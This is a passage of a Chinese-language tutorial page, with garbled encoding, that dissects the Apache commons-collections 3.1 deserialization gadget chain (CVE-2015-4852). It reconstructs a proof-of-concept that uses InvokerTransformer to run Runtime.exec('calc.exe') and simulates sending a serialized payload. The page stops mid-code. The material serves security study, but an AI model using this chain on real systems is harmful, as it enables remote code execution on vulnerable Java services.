<!doctype html><html lang=cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>JAVAååºåˆ—åŒ– - commons-collections - 1 | æå®¢å¿«è¨Š</title><meta property="og:title" content="JAVAååºåˆ—åŒ– - commons-collections - 1 - æå®¢å¿«è¨Š"><meta property="og:type" content="article"><meta property="og:locale" content="cn"><meta property="og:image" content="https://p1.pstatp.com/large/pgc-image/ecc736cc16fc4ab584bae36f7724c7c8"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><meta property="article:published_time" content="2020-11-14T21:03:08+08:00"><meta property="article:modified_time" content="2020-11-14T21:03:08+08:00"><meta name=Keywords content><meta name=description content="JAVAååºåˆ—åŒ– - commons-collections - 1"><meta name=author content="æå®¢å¿«è¨Š"><meta property="og:url" content="/cn/%E7%A7%91%E6%8A%80/a6b9d78d.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>ğŸ¤“ æå®¢å¿«è®¯ Geek Bank</a></h1><p class=description>ä¸ºä½ å¸¦æ¥æœ€å…¨çš„ç§‘æŠ€çŸ¥è¯† ğŸ§¡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>çŒœä½ å–œæ­¡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=ç§‘æŠ€>ç§‘æŠ€</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=éŠæˆ²>éŠæˆ²</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=ç§‘å­¸>ç§‘å­¸</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>JAVAååºåˆ—åŒ– - commons-collections - 1</h1></header><date class="post-meta meta-date">2020-11-14</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=cn/categories/%E7%A7%91%E6%8A%80.html>ç§‘æŠ€</a></span></div><div class=post-content><p>ä»¥ä¸‹æ–‡ç« æ¥æºäºé›·ç¥ä¼—æµ‹ ï¼Œä½œè€…lala</p><p><strong>No.1å£°æ˜</strong></p><p>ç”±äºä¼ æ’­ã€åˆ©ç”¨æ­¤æ–‡æ‰€æä¾›çš„ä¿¡æ¯è€Œé€ æˆçš„ä»»ä½•ç›´æ¥æˆ–è€…é—´æ¥çš„åæœåŠæŸå¤±ï¼Œå‡ç”±ä½¿ç”¨è€…æœ¬äººè´Ÿè´£ï¼Œé›·ç¥ä¼—æµ‹ä»¥åŠæ–‡ç« ä½œè€…ä¸ä¸ºæ­¤æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚é›·ç¥ä¼—æµ‹æ‹¥æœ‰å¯¹æ­¤æ–‡ç« çš„ä¿®æ”¹å’Œè§£é‡Šæƒã€‚å¦‚æ¬²è½¬è½½æˆ–ä¼ æ’­æ­¤æ–‡ç« ï¼Œå¿…é¡»ä¿è¯æ­¤æ–‡ç« çš„å®Œæ•´æ€§ï¼ŒåŒ…æ‹¬ç‰ˆæƒå£°æ˜ç­‰å…¨éƒ¨å†…å®¹ã€‚æœªç»é›·ç¥ä¼—æµ‹å…è®¸ï¼Œä¸å¾—ä»»æ„ä¿®æ”¹æˆ–è€…å¢å‡æ­¤æ–‡ç« å†…å®¹ï¼Œä¸å¾—ä»¥ä»»ä½•æ–¹å¼å°†å…¶ç”¨äºå•†ä¸šç›®çš„ã€‚</p><p><strong>No.2å‰è¨€</strong></p><p>è¿™æ˜¯ä¸ªäººå­¦ä¹ javaååºåˆ—åŒ–çš„ç¬¬ä¸€ç¯‡åˆ©ç”¨é“¾çš„æ–‡ç« ï¼Œå°±å¥½åƒPç‰›è¯´çš„ä¸çŸ¥é“ä¸ºä»€ä¹ˆç½‘ä¸Šè®²åˆ°javaååºåˆ—åŒ–å­¦ä¹ ï¼Œä¸Šæ¥å°±æ˜¯ccé“¾ï¼Œä½ çŸ¥é“è¿™ä¸ªé“¾å®ƒæœ‰å¤šå¤æ‚ä¹ˆ.jpgã€‚èŒæ–°ä¹Ÿæ˜¯ç†æ‰€å½“ç„¶çš„è¸©äº†è¿™ä¸ªå‘ï¼Œç„¶åâ€¦..åœ¨ä¸€è·¯è´¨ç–‘è‡ªå·±æ™ºå•†å’Œ"æˆ‘ä¸æœ"çš„æƒ…å†µä¸‹è¶Ÿäº†è¿‡å»ã€‚</p><p>è·¯éš¾è¡Œï¼Œéš¾è¡Œï¼Œæ€»å½’è¦èµ°ã€‚</p><p>èµ°æ¥ï¼Œå›æœ›å»ï¼Œå‘µï¼Œç‰›é€¼ã€‚</p><p>åœ¨æ­¤æ–‡ä¸­æ˜¯ä»¥ä¸€ä¸ªåªäº†è§£javaåå°„æœºåˆ¶å’Œååºåˆ—åŒ–åˆ©ç”¨ç‚¹ï¼ˆreadObjectï¼‰çš„è§†è§’å»ä¸€ç‚¹ç‚¹å¤ç°æ¨å¯¼äº†commons-collectionsã€jdk1.7çš„pocçš„æ„é€ ã€‚</p><p>åŒæ—¶è®°å½•ä¸‹äº†ä¸€ä¸ªä¸ªè¸©çš„å‘ï¼Œå†çˆ¬å‡ºæ¥ï¼Œå†è·³è¿›å»ï¼Œå†çˆ¬å‡ºæ¥çš„å†ç¨‹ã€‚</p><p>å¦‚æœä½ å…·å¤‡äº†åå°„æœºåˆ¶å’Œååºåˆ—åŒ–åŸºæœ¬åŸç†çš„çŸ¥è¯†ï¼ŒåŒæ—¶æƒ³å­¦ä¹ ccé“¾çš„è¯ï¼Œä¸ªäººæ„Ÿè§‰æ˜¯è¿™ç¯‡æ–‡æ˜¯å†é€‚åˆä¸è¿‡äº†ã€‚</p><p>é‚£ä¹ˆå¼€å§‹ã€‚</p><p>äº†è§£åå°„æœºåˆ¶çš„è¯ï¼Œæˆ‘ä»¬ä¼šå‘ç°è‹¥å­˜åœ¨ä¸€ä¸ªå›ºæœ‰çš„åå°„æœºåˆ¶æ—¶ï¼Œè¾“å…¥å¯æ§ï¼Œå°±å¯èƒ½å½¢æˆä»»æ„å‡½æ•°è°ƒç”¨çš„æƒ…å†µï¼Œå…·æœ‰æå¤§çš„å±å®³ã€‚ä½†å®é™…ä¸ŠçœŸçš„æœ‰å­˜åœ¨è¿™ç§æƒ…å†µï¼šè¿™å°±æ˜¯commons-collections-3.1 jaråŒ…ï¼Œcveç¼–å·ï¼šcve-2015-4852</p><p>åœ¨å¼€å§‹ä¹‹å‰æˆ‘ä»¬éœ€è¦ç†ä¸€ä¸‹ååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»æµç¨‹ï¼š</p><ol start=1><li>å®¢æˆ·ç«¯æ„é€ payload(æœ‰æ•ˆè½½è·)ï¼Œå¹¶è¿›è¡Œä¸€å±‚å±‚çš„å°è£…ï¼Œå®Œæˆæœ€åçš„expï¼ˆexploit-åˆ©ç”¨ä»£ç ï¼‰</li><li>expå‘é€åˆ°æœåŠ¡ç«¯ï¼Œè¿›å…¥ä¸€ä¸ªæœåŠ¡ç«¯è‡ªä¸»å¤å†™ï¼ˆä¹Ÿå¯èƒ½æ˜¯ä¹Ÿæœ‰ç»„ä»¶å¤å†™ï¼‰çš„readobjectå‡½æ•°ï¼Œå®ƒä¼šååºåˆ—åŒ–æ¢å¤æˆ‘ä»¬æ„é€ çš„expå»å½¢æˆä¸€ä¸ªæ¶æ„çš„æ•°æ®æ ¼å¼exp_1ï¼ˆå‰¥å»ç¬¬ä¸€å±‚ï¼‰</li><li>è¿™ä¸ªæ¶æ„æ•°æ®exp_1åœ¨æ¥ä¸‹æ¥çš„å¤„ç†æµç¨‹(å¯èƒ½æ˜¯åœ¨è‡ªä¸»å¤å†™çš„readobjectä¸­ã€ä¹Ÿå¯èƒ½æ˜¯åœ¨å¤–é¢çš„é€»è¾‘ä¸­)ï¼Œä¼šæ‰§è¡Œä¸€ä¸ªexp_1è¿™ä¸ªæ¶æ„æ•°æ®ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œåœ¨æ–¹æ³•ä¸­ä¼šæ ¹æ®exp_1çš„å†…å®¹è¿›è¡Œå‡½å¤„ç†ï¼Œä»è€Œä¸€å±‚å±‚åœ°å‰¥å»ï¼ˆæˆ–è€…è¯´å˜å½¢ã€è§£æï¼‰æˆ‘ä»¬exp_1å˜æˆexp_2ã€exp_3â€¦â€¦</li><li>æœ€ååœ¨ä¸€ä¸ªå¯æ‰§è¡Œä»»æ„å‘½ä»¤çš„å‡½æ•°ä¸­æ‰§è¡Œæœ€åçš„payloadï¼Œå®Œæˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚</li></ol><p>é‚£ä¹ˆä»¥ä¸Šå¤§æ¦‚å¯ä»¥åˆ†æˆä¸‰ä¸ªä¸»è¦éƒ¨åˆ†ï¼š</p><ol start=1><li>payloadï¼šéœ€è¦è®©æœåŠ¡ç«¯æ‰§è¡Œçš„è¯­å¥ï¼šæ¯”å¦‚è¯´å¼¹è®¡ç®—å™¨è¿˜æ˜¯æ‰§è¡Œè¿œç¨‹è®¿é—®ç­‰ï¼›æˆ‘æŠŠå®ƒç§°ä¸ºï¼špayload</li><li>ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼šæœåŠ¡ç«¯ä¸­å­˜åœ¨çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œä¼šä¸€å±‚å±‚æ‹¨å¼€æˆ‘ä»¬çš„expï¼Œæœ€åæ‰§è¡Œpayloadã€‚(åœ¨æ­¤ç¯‡ä¸­å°±æ˜¯commons-collectionsåˆ©ç”¨é“¾)</li><li>readObjectå¤å†™åˆ©ç”¨ç‚¹ï¼šæœåŠ¡ç«¯ä¸­å­˜åœ¨çš„å¯ä»¥ä¸æˆ‘ä»¬æ¼æ´é“¾ç›¸æ¥çš„å¹¶ä¸”å¯ä»¥ä»å¤–éƒ¨è®¿é—®çš„readObjectå‡½æ•°å¤å†™ç‚¹ï¼›æˆ‘æŠŠå®ƒç§°ä¸ºreadObjectå¤å†™åˆ©ç”¨ç‚¹ï¼ˆè‡ªåˆ›åç§°â€¦ï¼‰</li></ol><p><strong>No.3commons-collections-3.1</strong></p><p>é¦–å…ˆæ¥çœ‹çœ‹commons-collectionsé¡¹ç›®å§å®˜ç½‘ç¬¬ä¸€æ®µï¼š</p><p>Java commons-collectionsæ˜¯JDK 1.2ä¸­çš„ä¸€ä¸ªä¸»è¦æ–°å¢éƒ¨åˆ†ã€‚å®ƒæ·»åŠ äº†è®¸å¤šå¼ºå¤§çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥åŠ é€Ÿå¤§å¤šæ•°é‡è¦Javaåº”ç”¨ç¨‹åºçš„å¼€å‘ã€‚ä»é‚£æ—¶èµ·ï¼Œå®ƒå·²ç»æˆä¸ºJavaä¸­å…¬è®¤çš„é›†åˆå¤„ç†æ ‡å‡†ã€‚</p><p>Apache Commons Collectionsæ˜¯ä¸€ä¸ªæ‰©å±•äº†Javaæ ‡å‡†åº“é‡Œçš„Collectionç»“æ„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ï¼Œå®ƒæä¾›äº†å¾ˆå¤šå¼ºæœ‰åŠ›çš„æ•°æ®ç»“æ„ç±»å‹å¹¶ä¸”å®ç°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚ä½œä¸ºApacheå¼€æºé¡¹ç›®çš„é‡è¦ç»„ä»¶ï¼ŒCommons Collectionsè¢«å¹¿æ³›åº”ç”¨äºå„ç§Javaåº”ç”¨çš„å¼€å‘ã€‚å®ƒæ˜¯ä¸€ä¸ªåŸºç¡€æ•°æ®ç»“æ„åŒ…ï¼ŒåŒæ—¶å°è£…äº†å¾ˆå¤šåŠŸèƒ½ï¼Œå…¶ä¸­æˆ‘ä»¬éœ€è¦å…³æ³¨ä¸€ä¸ªåŠŸèƒ½ï¼š</p><ul><li>Transforming decorators that alter each object as it is added to the collection</li><li>è½¬åŒ–è£…é¥°å™¨ï¼šä¿®æ”¹æ¯ä¸€ä¸ªæ·»åŠ åˆ°collectionä¸­çš„object</li></ul><p>Commons Collectionså®ç°äº†ä¸€ä¸ªTransformedMapç±»ï¼Œè¯¥ç±»æ˜¯å¯¹Javaæ ‡å‡†æ•°æ®ç»“æ„Mapæ¥å£çš„ä¸€ä¸ªæ‰©å±•ã€‚è¯¥ç±»å¯ä»¥åœ¨ä¸€ä¸ªå…ƒç´ è¢«åŠ å…¥åˆ°é›†åˆå†…æ—¶ï¼Œè‡ªåŠ¨å¯¹è¯¥å…ƒç´ è¿›è¡Œç‰¹å®šçš„ä¿®é¥°å˜æ¢ï¼Œå…·ä½“çš„å˜æ¢é€»è¾‘ç”±Transformerç±»å®šä¹‰ï¼ŒTransformeråœ¨TransformedMapå®ä¾‹åŒ–æ—¶ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚org.apache.commons.collections.Transformerè¿™ä¸ªç±»å¯ä»¥æ»¡è¶³å›ºå®šçš„ç±»å‹è½¬åŒ–éœ€æ±‚ï¼Œå…¶è½¬åŒ–å‡½æ•°å¯ä»¥è‡ªå®šä¹‰å®ç°ï¼Œæˆ‘ä»¬çš„æ¼æ´è§¦å‘å‡½æ•°å°±æ˜¯åœ¨äºè¿™ä¸ªç‚¹ã€‚</p><p>æ¼æ´å¤ç°éœ€è¦ä¸‹è½½3.1ç‰ˆæœ¬,è¿›å»å¯»è§…ä¸€ä¸‹æºç å’ŒjaråŒ…éƒ½æœ‰ã€‚</p><p>ç”±äºæ²¡æœ‰æ‰¾åˆ°æ¼æ´ç‰ˆæœ¬3.1çš„apiè¯´æ˜ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒ3.2.2çš„apiæ–‡æ¡£</p><p><strong>No.4POC->åˆ©ç”¨é“¾</strong></p><p>æˆ‘ä»¬å°†é€šè¿‡è°ƒè¯•POCå¾—åˆ°æ¼æ´åˆ©ç”¨é“¾çš„è°ƒç”¨æ ˆï¼Œé¡ºä¾¿ä»‹ç»ä¸€ä¸‹å„ä¸ªç±»ï¼Œå†é€šè¿‡åˆ†æè°ƒç”¨æ ˆçš„å‡½æ•°ï¼Œåæ¨å‡ºPOCæ¥æ¢ç©¶å…¶ä¸­çš„åˆ©ç”¨åŸç†ã€‚</p><p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ç½‘ä¸Šçš„POCä»£ç ï¼Œå¦‚ä¸‹ï¼š</p><p>import org.apache.commons.collections.*;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class commons_collections_3_1 { public static void main(String args) throws Exception { //æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»Transformer transformerChain = new ChainedTransformer(transformers); //åˆ›å»ºMapå¹¶ç»‘å®štransformerChinaMap innerMap = new HashMap;innerMap.put("value", "value"); //ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //è§¦å‘æ¼æ´Map.Entry onlyElement = (Map.Entry) outerMap.entrySet.iterator.next; //outerMapåä¸€ä¸²ä¸œè¥¿ï¼Œå…¶å®å°±æ˜¯è·å–è¿™ä¸ªmapçš„ç¬¬ä¸€ä¸ªé”®å€¼å¯¹ï¼ˆvalue,valueï¼‰ï¼›ç„¶åè½¬åŒ–æˆMap.Entryå½¢å¼ï¼Œè¿™æ˜¯mapçš„é”®å€¼å¯¹æ•°æ®æ ¼å¼onlyElement.setValue("foobar");}}</p><p>å¥½å¥½çœ‹ä»£ç çš„åŒå­¦è‚¯å®šä¼šæ„è¯†åˆ°ï¼Œä»¥ä¸Šçš„pocå…¶å®åªåŒ…æ‹¬æˆ‘æ€»ç»“ä¸‰è¦ç´ çš„payloadå’Œååºåˆ—åŒ–åˆ©ç”¨é“¾ä¸¤è€…ã€‚è€Œå…³é”®çš„readObjectå¤å†™åˆ©ç”¨ç‚¹æ²¡æœ‰åŒ…å«åœ¨å†…ã€‚äº‹å®ç¡®å®å¦‚æ­¤ã€‚è¿™ä¸ªpocçš„å¤å†™åˆ©ç”¨ç‚¹æ˜¯sun.reflect.annotation.AnnotationInvocationHandlerçš„readObjectï¼Œä½†æ˜¯æˆ‘ä»¬å…ˆç²¾ç®€ä»£ç å…³æ³¨payloadå’Œåˆ©ç”¨é“¾ï¼Œæœ€åå†åŠ ä¸ŠreadObjectå¤å†™ç‚¹ã€‚</p><p>è°ƒè¯•ä»¥ä¸ŠPOCï¼Œå¾—åˆ°ä¸¤ç§è°ƒç”¨æ ˆï¼š</p><p><strong>æ¼æ´é“¾</strong></p><p>Map.Entryå…¶å®å°±æ˜¯é”®å€¼å¯¹çš„æ•°æ®æ ¼å¼ï¼Œå…¶setValueå‡½æ•°å¦‚ä¸‹AbstracInputCheckedMapDecorator.class</p><p>public Object setValue(Object value) {value = this.parent.checkSetValue(value);//è¿›å…¥æ­¤å¤„return super.entry.setValue(value);}</p><p>TransformedMapæ˜¯ä¸€ç§é‡å†™mapç±»å‹çš„setå‡½æ•°å’ŒMap.Entryç±»å‹çš„setValueå‡½æ•°å»è°ƒç”¨è½¬æ¢é“¾çš„Mapç±»å‹ã€‚TransformedMap.class</p><p>protected Object checkSetValue(Object value) { return this.valueTransformer.transform(value);//è¿›å…¥æ­¤å¤„}</p><p>ç”±äºTransformedMapå…·æœ‰commons_collectionsçš„è½¬å˜ç‰¹æ€§ï¼Œå½“èµ‹å€¼ä¸€ä¸ªé”®å€¼å¯¹çš„æ—¶å€™ä¼šè‡ªåŠ¨å¯¹è¾“å…¥å€¼è¿›è¡Œé¢„è®¾çš„Transformerçš„è°ƒç”¨ã€‚</p><p>ChainedTransformer.classï¼šè¿™é‡Œæœ‰ä¸€ä¸ª</p><p>public Object transform(Object object) { for(int i = 0; i &lt; this.iTransformers.length; ++i) { //å¾ªç¯è¿›å…¥æ­¤å¤„ï¼Œå…ˆè¿›å…¥1æ¬¡ConstantTransformer.classï¼Œå†3æ¬¡InvokerTransformer.classobject = this.iTransformers[i].transform(object); //å¦å¤–éœ€è¦æ³¨æ„åœ¨æ•°ç»„çš„å¾ªç¯ä¸­ï¼Œå‰ä¸€æ¬¡transformå‡½æ•°çš„è¿”å›å€¼ï¼Œä¼šä½œä¸ºä¸‹ä¸€æ¬¡transformå‡½æ•°çš„objectå‚æ•°è¾“å…¥ã€‚} return object;}</p><p>transformå‡½æ•°æ˜¯ä¸€ä¸ªæ¥å£å‡½æ•°ï¼Œåœ¨ä¸Šé¢çš„å¾ªç¯ä¸­è¿›å…¥äº†ä¸åŒçš„å‡½æ•°ã€‚å…ˆæ˜¯1æ¬¡ConstantTransformer.class</p><p>public Object transform(Object input) { return this.iConstant;}</p><p>å†æ˜¯è¿›å…¥äº†InvokerTransformer.classï¼Œçœ‹åˆ°è¿™ä¸ªå°±ä¼šå‘ç°æœ‰ç‚¹ä¸œè¥¿äº†ã€‚</p><p>public Object transform(Object input) { if (input == null) { return null;} else { try { //è·å–inputå¯¹è±¡çš„classClass cls = input.getClass; //æ ¹æ®iMethodNameã€iParamTypesé€‰æ‹©clsä¸­çš„ä¸€ä¸ªæ–¹æ³•Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //æ ¹æ®iArgså‚æ•°è°ƒç”¨è¿™ä¸ªæ–¹æ³•return method.invoke(input, this.iArgs);} catch (NoSuchMethodException var5) { throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass + "' does not exist");} catch (IllegalAccessException var6) { throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass + "' cannot be accessed");} catch (InvocationTargetException var7) { throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass + "' threw an exception", var7);}}}}</p><p>æ˜æ˜¾çš„åå°„æœºåˆ¶ï¼Œå¯è§InvokerTransformerå°±æ˜¯æˆ‘ä»¬çš„è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œå¤„ï¼Œæˆ‘ä»¬çœ‹çœ‹æºç ä¸­çš„æ–‡ä»¶æè¿°ï¼šå…ˆçœ‹çœ‹æˆ‘ä»¬éœ€è¦å…³æ³¨çš„InvokerTransformerç±»çš„æè¿°ï¼ˆåœ¨jaråŒ…ä¸­æ˜¯æ‰¾ä¸åˆ°æè¿°ä¿¡æ¯çš„ï¼Œå¯ä»¥é€šè¿‡ä¸‹è½½å®˜æ–¹æºç å¾—åˆ°ï¼‰ï¼š</p><p>/*** Transformer implementation that creates a new object instance by reflection.*é€šè¿‡åå°„æœºåˆ¶åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡å®ä¾‹çš„è½¬æ¢å™¨å®ç°</p><p>æˆ‘ä»¬å¯ä»¥è¿™é‡Œæœ‰ç»å…¸çš„åå°„æœºåˆ¶è°ƒç”¨ï¼Œåœ¨ç»†èŠ‚åˆ†æå‰æˆ‘ä»¬å…ˆæ•´ç†ä¸€ä¸‹è°ƒç”¨æ ˆï¼Œä½†ä¸éœ€è¦å¾ˆç†è§£ã€‚</p><p>Map.Entry ç±»å‹setValue("foobar")=> AbstracInputCheckedMapDecorator.setValue=> TransformedMap.checkSetValue=> ChainedTransformer.transform(Object object)æ ¹æ®æ•°ç»„ï¼Œå…ˆè¿›å…¥ => ConstantTransformer.transform(Object input)å†è¿›å…¥ => InvokerTransformer.transform(Object input)</p><p><strong>No.5é‡æ„POC</strong></p><p>é¦–å…ˆæ˜ç¡®æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯ä¸ºäº†æ‰§è¡Œè¯­å¥Runtime.getRuntime.exec("calc.exe");</p><ul><li>Runtime.getRuntimeï¼šè·å–ä¸€ä¸ªRuntimeçš„å®ä¾‹</li><li>execï¼šè°ƒç”¨å®ä¾‹çš„execå‡½æ•°</li></ul><p>å› ä¸ºæ¼æ´å‡½æ•°æœ€åæ˜¯é€šè¿‡åå°„æœºåˆ¶è°ƒç”¨ä»»æ„è¿™ä¸ªè¯­å¥å…ˆè½¬åŒ–æˆåå°„æœºåˆ¶å¦‚ä¸‹ï¼ˆåé¢éœ€è¦ç”¨åˆ°ï¼‰ï¼š</p><p>è‡³äºå¦‚ä½•æ„é€ åå°„æœºåˆ¶çš„è¯­å¥ï¼Œå‚è€ƒå¾€æœŸæ–‡ç« javaåå°„æœºåˆ¶</p><p>Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//æ­¤å¤„åœ¨è·å–å®ä¾‹,"calc.exe")</p><p><strong>ç¬¬ä¸€æ­¥ InvokerTransformer</strong></p><p>å†å›çœ‹åå°„æœºåˆ¶è§¦å‘å‡½æ•°InvokerTransformerç±»çš„transform(Object input)ï¼ˆåšäº†ç®€åŒ–å¤„ç†ï¼Œåªç•™å–é‡ç‚¹éƒ¨åˆ†ï¼‰ï¼š</p><p>public Object transform(Object input) {Class cls = input.getClass;Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs);</p><p>é€šè¿‡æ„é€ çš„åå°„æœºåˆ¶ä»¥åŠä»¥ä¸Šä»£ç è¿›è¡Œå¡«ç©ºï¼Œå¯ä»¥å¾—å‡ºå½“å˜é‡ç­‰äºä»¥ä¸‹å€¼æ—¶ï¼Œå¯å½¢æˆå‘½ä»¤æ‰§è¡Œï¼š</p><p>Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));this.iMethodName="exec"this.iParamTypes=String.classthis.iArgs="calc.exe"</p><p>é‚£ä¹ˆåœ¨InvokerTransformerç±»æºç ä¸­æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°èµ‹å€¼this.iMethodName,this.iParamTypes,this.iArgsçš„æ„é€ å‡½æ•°:</p><p>public InvokerTransformer(String methodName, Class paramTypes, Object args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args;}</p><p>æˆ‘ä»¬å°±å¯ä»¥æ„å»ºä»¥ä¸‹æµ‹è¯•ä»£ç ç›´æ¥è°ƒç”¨InvokerTransformeré€šè¿‡åå°„æ‰§è¡Œä»»æ„å‘½ä»¤ï¼šä¸‹é¢å¼€å§‹è¯•ä¸€ä¸‹ï¼š</p><p>public static void main(String args) throws Exception { //é€šè¿‡æ„é€ å‡½æ•°ï¼Œè¾“å…¥å¯¹åº”æ ¼å¼çš„å‚æ•°ï¼Œå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼InvokerTransformer a = new InvokerTransformer( "exec", new Class{String.class}, new String{"calc.exe"}); //æ„é€ inputObject input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")); //æ‰§è¡Œa.transform(input);}</p><div class=pgc-img><img alt="JAVAååºåˆ—åŒ– - commons-collections - 1" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ecc736cc16fc4ab584bae36f7724c7c8><p class=pgc-img-caption></p></div><p><strong>åœ¨ç¬¬äºŒæ­¥ä¹‹å‰</strong></p><p>å¼¹å‡ºäº†è®¡ç®—å™¨ï¼å¥½åƒå¾ˆå‰å®³çš„æ ·å­ï¼ç„¶åæˆ‘ä»¬æ¥æ¨¡æ‹Ÿä¸€ä¸‹åˆ©ç”¨åœºæ™¯ï¼š</p><ul><li>ä¸ºäº†æ–¹ä¾¿ï¼Œæ”»å‡»è€…å—å®³è€…å†™åœ¨åŒä¸€å‡½æ•°ä¸­</li><li>ä½¿ç”¨æ–‡ä»¶å†™å…¥ï¼Œä»£æ›¿ç½‘ç»œä¼ è¾“</li></ul><p>ç”±äºInvokerTransformerç»§æ‰¿äº†Serializableç±»ï¼Œæ˜¯å¯ä»¥æˆåŠŸåºåˆ—åŒ–çš„</p><p>public static void main(String args) throws Exception { //æ¨¡æ‹Ÿæ”»å‡»//1.å®¢æˆ·ç«¯æ„é€ åºåˆ—åŒ–payloadï¼Œä½¿ç”¨å†™å…¥æ–‡ä»¶æ¨¡æ‹Ÿå‘åŒ…æ”»å‡»InvokerTransformer a = new InvokerTransformer( "exec", new Class{String.class}, new String{"calc.exe"});FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(a); //2.æœåŠ¡ç«¯ä»æ–‡ä»¶ä¸­è¯»å–payloadæ¨¡æ‹Ÿæ¥å—åŒ…ï¼Œç„¶åè§¦å‘æ¼æ´//æœåŠ¡ç«¯ååºåˆ—åŒ–payloadè¯»å–FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //ç¥å¥‡ç¬¬ä¸€å¤„ï¼šæœåŠ¡ç«¯éœ€è¦è‡ªä¸»æ„é€ æ¶æ„inputObject input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")); //ç¥å¥‡ç¬¬äºŒå¤„ï¼šæœåŠ¡ç«¯éœ€è¦å°†å®¢æˆ·ç«¯è¾“å…¥ååºåˆ—åŒ–æˆInvokerTransformeræ ¼å¼ï¼Œå¹¶åœ¨æœåŠ¡ç«¯è‡ªä¸»ä¼ å…¥æ¶æ„å‚æ•°inputInvokerTransformer a_in = (InvokerTransformer) 